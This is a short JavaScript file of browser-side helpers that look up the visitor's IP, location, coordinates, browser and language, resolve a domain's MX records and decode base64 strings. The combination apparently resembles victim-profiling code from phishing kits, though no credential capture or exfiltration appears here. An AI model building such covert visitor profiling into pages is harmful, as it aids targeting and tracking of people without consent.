function handleBase64Data(string) {

  try {
	return atob(string);
  } catch (error) {
	return string;
  }
}

function getVisitorIP() {
  return new Promise(function (resolve, reject) {
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'https://ipinfo.io/json', true);
	xhr.onload = function () {
	  if (xhr.status >= 200 && xhr.status < 300) {
		var response = JSON.parse(xhr.responseText);
		resolve(response);
	  } else {
		reject('Failed to fetch IP address');
	  }
	};
	xhr.onerror = function () {
	  reject('Failed to fetch IP address');
	};
	xhr.send();
  });
}

async function getCoordinatesFromIP(ip) {
  try {
	const response = await fetch(`https://ipapi.co/${ip}/json/`);
	const data = await response.json();
	if (data.latitude && data.longitude) {
	  return `${data.latitude}, ${data.longitude}`;
	} else {
	  return "Unavailable";
	}
  } catch (error) {
	console.error("Error fetching coordinates:", error);
	return "Unavailable";
  }
}

async function getMXRecord(domain) {
  try {
	const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
	const data = await response.json();

	if (data && data.Answer && data.Answer.length > 0) {
	  const mxRecords = data.Answer.map(record => `${record.data}`).join('\n');
	  return mxRecords;
	} else {
	  return 'no-mx';
	}
  } catch (error) {
	return 'MX-Error';
  }
}



async function sendVisitorIP() {
  try {
	var visitorInfo = await getVisitorIP();
	return [visitorInfo.ip, visitorInfo.country, visitorInfo.city, visitorInfo.region];
  } catch (error) {
	return error
  }
}

function GetBrowserandLanguage() {
  let browser = window.clientInformation.appVersion;
  let language = window.clientInformation.language;
  let info = [browser, language]

  return info;
}